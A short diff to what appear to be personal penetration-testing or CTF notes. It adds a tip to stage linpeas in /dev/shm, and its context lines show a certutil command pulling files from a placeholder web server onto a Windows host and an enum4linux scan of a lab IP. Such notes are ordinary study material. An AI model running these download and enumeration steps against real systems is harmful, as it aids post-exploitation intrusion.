@@ -146,3 +146,4 @@ if you get a shell but don't have much auth and you want to scan machine to see 
 
 - use 'certutil -urlcache -f http://<ip>/<file>' to download files from web server (window machine)
 - scan samba using enum4linux: Enum4linux is a tool for enumerating information from Windows and Samba systems. ex: enum4linux -a 10.10.179.141 | tee enum4linux.log (tee here will read and write the content if the scan into log file)
+- use /dev/shm to download linpeas
